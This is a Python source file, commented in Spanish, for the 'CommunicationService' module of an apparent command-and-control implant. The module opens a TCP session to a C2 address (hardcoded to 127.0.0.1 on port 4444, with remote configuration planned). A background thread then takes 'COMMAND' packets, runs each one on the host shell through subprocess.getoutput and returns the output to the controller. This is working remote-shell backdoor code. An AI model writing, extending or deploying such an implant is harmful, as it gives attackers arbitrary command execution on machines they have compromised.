# Library import
from system import ModuleInterface
from shared.communication_architecture import layers
import subprocess
import threading
import time
from typing import Optional

# Classes definition
class CommunicationService(ModuleInterface):
    # Class properties definition
    MODULE_NAME = "CORE_COMMUNICATION_SERVICE"

    def __init__(self,
        container,
        system
    ) -> None:
        # Constructor hereditance
        super().__init__(container, system)

        # Instance properties definition
        self.layers_container = layers.LayerContainer()
        self.running: bool = False
        self.process_thread: Optional[threading.Thread] = None
    
    # Private methods
    def _command_loop(self, session) -> None:
        print(f"[{self.MODULE_NAME}] Command loop started.")
        while self.running:
            try:
                # Recibimos el paquete de datos (timeout para permitir salida limpia)
                datapackage = session.datapackages_handler.receive_datapackage(timeout=10)
                
                if datapackage and "COMMAND" in datapackage:
                    command = datapackage.get("COMMAND")
                    print(f"[{self.MODULE_NAME}] Executing: {command}")
                    
                    # Ejecución del comando en el host
                    result = subprocess.getoutput(command)
                    
                    # Retorno de resultados al C2
                    session.datapackages_handler.send_datapackage({"RESULT": result})
            except Exception as e:
                print(f"[{self.MODULE_NAME}] Connection lost or error: {e}")
                break
        
        self.running = False


    def start(self) -> bool:
        try:
            print("[DEBUG] Intentando importación forzada de dependencias...")
            import shared.communication_architecture.layers as test_layers
            print("[DEBUG] Shared detectado correctamente.")
            
            from system.core.modules.communication_service import CommunicationService
            print("[DEBUG] Clase CommunicationService encontrada.")
        except Exception as e:
            print(f"[DEBUG] ERROR CRÍTICO EN IMPORTACIÓN: {e}")
            import traceback
            traceback.print_exc()
        print(f"[{self.MODULE_NAME}] Initializing communications...")
        
        try:
            # 1. Levantar infraestructura de capas
            self.layers_container.start()
            transport = self.layers_container.query_layer("TRANSPORT")
            comm_layer = self.layers_container.query_layer("COMMUNICATION")
            transport.start()
            comm_layer.start()

            # 2. Configuración de conexión (Hardcoded para test, luego vía VFS)
            tcp_module = transport.query_module("TRANSPORT_TCP_IP")
            cfg = tcp_module.CONFIGURATIONS.copy()
            
            # Aquí usaríamos el VFS para obtener la IP/Puerto del C2
            cfg.query_setting("REMOTE_ADDRESS").value.value = "127.0.0.1"
            cfg.query_setting("REMOTE_PORT").value.value = 4444 # Puerto de ejemplo

            # 3. Conexión y creación de sesión
            client_id = transport.connect(tcp_module, cfg)
            if not client_id:
                return False

            session_uuid = comm_layer.create_session(connection_identifier=client_id, local_role="PASSIVE")
            session = comm_layer.sessions_table.get(session_uuid)

            if session:
                self.running = True
                # Lanzamos el bucle en un hilo separado para no bloquear el CoreManager
                self.worker_thread = threading.Thread(target=self._command_loop, args=(session,))
                self.worker_thread.daemon = True
                self.worker_thread.start()
                return True

        except Exception as e:
            print(f"[{self.MODULE_NAME}] Failed to initialize: {e}")
            return False

        return False

    def stop(self) -> bool:
        self.running = False
        if self.worker_thread:
            self.worker_thread.join()
        self.layers_container.stop()
        return True
